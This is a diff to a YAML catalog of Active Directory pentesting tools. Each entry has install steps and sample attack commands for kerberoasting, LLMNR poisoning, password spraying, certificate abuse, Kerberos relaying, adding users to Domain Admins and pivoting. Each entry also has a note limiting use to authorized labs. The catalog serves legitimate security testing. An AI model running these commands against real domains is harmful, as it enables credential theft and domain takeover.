@@ -6,10 +6,21 @@ category:
   title: "Active Directory (catalog)"
   merge_into: "Active Directory Tools"
 
-# --- enrich existing Python-defined tools by title --------------------------
-overlay:
+overlay: []
+
+# --- migrated from tools/active_directory.py + missing AD tools ------------
+tools:
   - title: "BloodHound (AD Attack Paths)"
+    kind: install
     tags: [active-directory, enumeration, lateral-movement, credentials]
+    description: "Uses graph theory to reveal hidden attack paths in Active Directory/Azure environments."
+    supported_os: [linux, macos]
+    install:
+      commands:
+        - "pip install --user bloodhound"
+        - "sudo apt-get install -y neo4j"
+    run: ["bloodhound-python --help"]
+    project_url: "https://github.com/BloodHoundAD/BloodHound"
     usage:
       - ["start the neo4j database", "sudo neo4j start"]
       - ["collect all data (SharpHound-Python)", "bloodhound-python -d domain.local -u user -p pass -c all -ns 10.10.10.10"]
@@ -21,8 +32,14 @@ overlay:
       domain you are explicitly authorized to assess or your own lab domain.
 
   - title: "NetExec — nxc (Network Pentesting)"
+    kind: install
     tags: [active-directory, network, enumeration, credentials, password-attack]
+    description: "Swiss army knife for pentesting Windows/AD networks. Successor to CrackMapExec."
+    supported_os: [linux, macos]
     system_pkgs: {which: nxc}
+    install: {pip: netexec}
+    run: ["nxc --help"]
+    project_url: "https://github.com/Pennyw0rth/NetExec"
     usage:
       - ["authenticate over SMB", "nxc smb 10.10.10.0/24 -u user -p pass"]
       - ["null session — list shares", "nxc smb 10.10.10.10 -u '' -p '' --shares"]
@@ -36,8 +53,14 @@ overlay:
       full range is in scope. Authorized engagements or your own lab only.
 
   - title: "Impacket (Network Protocol Tools)"
+    kind: install
     tags: [active-directory, credentials, network, lateral-movement, kerberos]
+    description: "Python classes for working with SMB, MSRPC, Kerberos, LDAP, and more."
+    supported_os: [linux, macos]
     system_pkgs: {which: impacket-smbclient}
+    install: {pip: impacket}
+    run: ["impacket-smbclient --help"]
+    project_url: "https://github.com/fortra/impacket"
     usage:
       - ["kerberoast — request service TGS", "impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.10 -request"]
       - ["AS-REP roast users with no pre-auth", "impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10"]
@@ -51,8 +74,14 @@ overlay:
       have written authorization or in your own lab domain.
 
   - title: "Responder (LLMNR/NBT-NS Poisoner)"
+    kind: install
     tags: [active-directory, credentials, mitm, sniffing, network, poisoning, relay]
+    description: "LLMNR/NBT-NS/MDNS poisoner with rogue authentication servers for credential capture."
+    supported_os: [linux]
     system_pkgs: {which: responder, apt: responder}
+    install: {git: "https://github.com/lgandx/Responder.git"}
+    run: ["cd Responder && sudo python3 Responder.py --help"]
+    project_url: "https://github.com/lgandx/Responder"
     usage:
       - ["poison LLMNR/NBT-NS/MDNS on an interface", "sudo responder -I eth0"]
       - ["passive analyze mode (no poisoning)", "sudo responder -I eth0 -A"]
@@ -65,7 +94,13 @@ overlay:
       -A analyze mode first to observe without poisoning.
 
   - title: "Certipy (AD Certificate Abuse)"
+    kind: install
     tags: [active-directory, credentials, privesc, enumeration, adcs]
+    description: "Active Directory Certificate Services enumeration and abuse tool."
+    supported_os: [linux, macos]
+    install: {pip: certipy-ad}
+    run: ["certipy --help"]
+    project_url: "https://github.com/ly4k/Certipy"
     usage:
       - ["find vulnerable cert templates", "certipy find -u user@domain.local -p pass -dc-ip 10.10.10.10 -vulnerable"]
       - ["request a certificate from a template", "certipy req -u user@domain.local -p pass -ca CA-NAME -template TemplateName -dc-ip 10.10.10.10"]
@@ -77,7 +112,13 @@ overlay:
       attack — authorized engagements or your own lab CA only.
 
   - title: "Kerbrute (Kerberos Brute Force)"
+    kind: install
     tags: [active-directory, bruteforce, password-attack, enumeration, credentials, kerberos]
+    description: "Kerberos pre-auth brute-forcer for username enumeration and password spraying."
+    supported_os: [linux, macos]
+    install: {go: "github.com/ropnop/kerbrute@latest"}
+    run: ["kerbrute --help"]
+    project_url: "https://github.com/ropnop/kerbrute"
     usage:
       - ["enumerate valid usernames", "kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt"]
       - ["password-spray a user list", "kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password1'"]
@@ -87,9 +128,6 @@ overlay:
       Kerbrute uses Kerberos pre-auth, so username enumeration is quiet, but spraying and
       brute-force can lock out domain accounts — mind the lockout policy. Authorized
       engagements or your own lab domain only.
-
-# --- genuinely-missing, widely-used AD tool ---------------------------------
-tools:
   - title: "ldapdomaindump (AD LDAP Dumper)"
     kind: install
     tags: [active-directory, enumeration, credentials]
@@ -146,6 +184,83 @@ tools:
       Parsing your own pcap files is passive and safe. Live capture needs root and only
       sees traffic on a network you're authorized to monitor. Depends on pcapy-ng
       (`pip3 install pcapy-ng`, plus libpcap-dev). Feeds nicely off Responder captures.
+
+  - title: "bloodyAD (AD Privilege Escalation)"
+    kind: install
+    tags: [active-directory, privesc, enumeration, kerberos]
+    description: "Active Directory privilege escalation and ACL/DACL abuse toolkit over LDAP/LDAPS, supporting Kerberos, NTLM, and pass-the-hash."
+    system_pkgs: {which: bloodyAD}
+    install: {pip: bloodyAD}
+    run: ["bloodyAD --help"]
+    project_url: "https://github.com/CravateRouge/bloodyAD"
+    usage:
+      - ["inspect writable objects for current user", "bloodyAD -d corp.local -u user -p pass --host dc01.corp.local get writable"]
+      - ["add user to a privileged group when ACL permits", "bloodyAD -d corp.local -u user -p pass --host dc01.corp.local add groupMember 'Domain Admins' user"]
+    lab_safe_notes: >-
+      `get` subcommands perform read-only LDAP queries; `set`/`add`/`remove` modify live
+      AD objects — use strictly in authorized lab or assessment scopes.
+
+  - title: "ligolo-ng (TUN-based Network Pivoting)"
+    kind: install
+    tags: [active-directory, tunneling, lateral-movement, network]
+    description: "Fast, lightweight multi-hop pivoting tool using a real TUN interface instead of SOCKS proxies — lets nmap and impacket work natively."
+    system_pkgs: {which: ligolo-proxy, brew: ligolo-ng}
+    install: {go: "github.com/nicocha30/ligolo-ng/cmd/proxy@latest"}
+    run: ["proxy --help"]
+    project_url: "https://github.com/nicocha30/ligolo-ng"
+    usage:
+      - ["start the operator proxy listener", "ligolo-proxy -selfcert"]
+      - ["connect an agent back from a pivot host", "./agent -connect <proxy-ip>:11601 -ignore-cert"]
+    lab_safe_notes: >-
+      Creates a TUN interface on the operator host (`ip tuntap add`) and tunnels traffic
+      to internal subnets — use only within authorized assessment scopes.
+
+  - title: "krbrelayx (Kerberos Relaying Toolkit)"
+    kind: install
+    tags: [active-directory, kerberos, relay, credentials]
+    description: "Toolkit for Kerberos unconstrained delegation abuse, DNS record manipulation (`dnstool.py`), and Kerberos credential relaying."
+    system_pkgs: {which: krbrelayx.py}
+    install: {git: "https://github.com/dirkjanm/krbrelayx.git"}
+    run: ["python3 krbrelayx.py --help"]
+    project_url: "https://github.com/dirkjanm/krbrelayx"
+    usage:
+      - ["listen and relay incoming Kerberos auth", "python3 krbrelayx.py -aesKey <krbtgt_or_machine_aes>"]
+      - ["add an AD-integrated DNS record via LDAP", "python3 dnstool.py -u 'corp.local\\user' -p pass -a add -r attacker.corp.local -d 10.10.14.5 dc01.corp.local"]
+    lab_safe_notes: >-
+      Actively modifies AD DNS or relays Kerberos tickets — run only inside authorized
+      AD labs or scoped penetration tests.
+
+  - title: "RustHound (Fast AD BloodHound Collector)"
+    kind: install
+    tags: [active-directory, enumeration, recon]
+    description: >-
+      High-speed Rust-based Active Directory enumerator that collects users, groups,
+      computers, ACLs, and GPOs into BloodHound JSON files.
+    system_pkgs: {which: rusthound}
+    install: {commands: ["cargo install rusthound"]}
+    run: ["rusthound --help"]
+    project_url: "https://github.com/g0h4n/RustHound"
+    usage:
+      - ["collect AD data for BloodHound via LDAP", "rusthound -d corp.local -u user -p pass -o ./bh"]
+    lab_safe_notes: >-
+      Performs LDAP/SMB queries against Domain Controllers — run only in authorized
+      AD labs or scoped internal assessments.
+
+  - title: "adidnsdump (AD Integrated DNS Dumper)"
+    kind: install
+    tags: [active-directory, dns, enumeration]
+    description: >-
+      Enumerates and dumps Active Directory-integrated DNS zones and records over
+      LDAP using standard authenticated domain credentials.
+    system_pkgs: {which: adidnsdump}
+    install: {pipx: adidnsdump}
+    run: ["adidnsdump --help"]
+    project_url: "https://github.com/dirkjanm/adidnsdump"
+    usage:
+      - ["dump AD-integrated DNS records over LDAP", "adidnsdump -u 'CORP\\user' -p pass ldap://dc01.corp.local"]
+    lab_safe_notes: >-
+      Read-only LDAP DNS enumeration by default; never modify records outside an
+      explicitly authorized engagement.
 
 # --- high-value AD attack reference -----------------------------------------
   - title: "The Hacker Recipes (AD)"
